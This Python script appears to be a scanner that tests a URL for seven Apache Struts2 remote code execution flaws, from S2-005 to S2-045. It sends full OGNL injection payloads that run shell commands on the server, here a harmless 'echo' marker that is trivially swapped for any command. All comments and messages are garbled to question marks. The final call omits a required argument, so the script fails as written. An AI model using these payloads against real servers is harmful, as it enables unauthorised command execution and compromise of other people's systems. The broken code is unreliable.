import requests


headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
           }

s2_045poc = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo S2-045').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
}



def poc(url,timeout):
    url = url
    poc = {
        "s2-005":'''('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context[%5C'xwork.MethodAccessor.denyMethodExecution%5C']%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)(('%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('%5C43xman.getWriter().print(%22S2-005%22)')(d))&(i95)(('%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))')(d))&(i99)(('%5C43xman.getWriter().close()')(d))''',
        "s2-008":'''debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20S2-008%27%29.getInputStream%28%29%29)''',
        "s2-009":'''(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22echo%20S2-009%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]''',
        "s2-016":'''redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22echo%20S2-016%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D''',
        "s2-019":'''debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22echo%20S2-019%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()''',
        "s2-032":'''method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&cmd=echo%20S2-032&dd=%20&d=____A&encoding=UTF-8'''
    }


    try:
        response = requests.get(url=url, headers=headers, data=poc['s2-005'], timeout=timeout)
        if 'S2-005' in response.text and response.status_code == 200:  # ?????????????????????S2-005???200??????????????????????????????
            print("[+] "+ url +" ----- ??????S2-005??????")
        else:
            print("[-] "+ url +" ----- ?????????S2-005??????")
    except Exception as out:
        print("??????S2-005??????..")
        print("????????????: ", out)



    try:
        response = requests.get(url=url+'?'+poc['s2-008'], headers=headers, timeout=timeout)
        if 'S2-008' in response.text and response.status_code == 200:  # ?????????????????????S2-008???200??????????????????????????????
            print("[+] "+ url +" ----- ??????S2-008??????")
        else:
            print("[-] "+ url +" ----- ?????????S2-008??????")
    except Exception as out:
        print("??????S2-008??????..")
        print("????????????: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-009'], headers=headers, timeout=timeout)
        if 'S2-009' in response.text and response.status_code == 200:  # ?????????????????????S2-009???200??????????????????????????????
            print("[+] "+ url +"----- ??????S2-009??????")
        else:
            print("[-] "+ url +" ----- ?????????S2-009??????")
    except Exception as out:
        print("??????S2-009??????..")
        print("????????????: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-016'], headers=headers, timeout=timeout)
        if 'S2-016' in response.text and response.status_code == 200:  # ?????????????????????S2-016???200??????????????????????????????
            print("[+] "+ url +" ----- ??????S2-016??????")
        else:
            print("[-] "+ url +" ----- ?????????S2-016??????")
    except Exception as out:
        print("??????S2-016??????..")
        print("????????????: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-019'], headers=headers, timeout=timeout)
        if 'S2-019' in response.text and response.status_code == 200:  # ?????????????????????S2-019???200??????????????????????????????
            print("[+] "+ url +" ----- ??????S2-019??????")
        else:
            print("[-] "+ url +" ----- ?????????S2-019??????")
    except Exception as out:
        print("??????S2-019??????..")
        print("????????????: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-032'], headers=headers, timeout=timeout)
        if 'S2-032' in response.text and response.status_code == 200:  # ?????????????????????S2-032???200??????????????????????????????
            print("[+] "+ url +" ----- ??????S2-032??????")
        else:
            print("[-] "+ url +" ----- ?????????S2-032??????")
    except Exception as out:
        print("??????S2-032??????..")
        print("????????????: ", out)


    try:
        response = requests.get(url=url, headers=s2_045poc, timeout=timeout)
        if 'S2-045' in response.text and response.status_code == 200:  # ?????????????????????S2-045???200??????????????????????????????
            print("[+] "+ url +" ----- ??????S2-045??????")
        else:
            print("[-] "+ url +" ----- ?????????S2-045??????",'\n')
    except Exception as out:
        print("??????S2-045??????..")
        print("????????????: ", out)

    print("========================????????????===========================")
    print('\n')


if __name__ =="__main__":
#    url = "http://192.168.43.132:23456/S2-005/example/HelloWorld.action"
#    url = "http://192.168.43.132:23456/S2-008/devmode.action"
#    url = "http://192.168.43.132:23456/S2-009/ajax/example5.action"
#    url = 'http://192.168.43.132:23456/S2-016/default.action'
#    url = "http://192.168.43.132:23456/S2-019/example/HelloWorld.action"
#    url = "http://192.168.43.132:23456/S2-032/memoshow.action"
#    url = "http://192.168.43.132:23456/S2-045/orders"
    url = input("???????????????URL???")
    timeout = input("?????????")
    poc(url)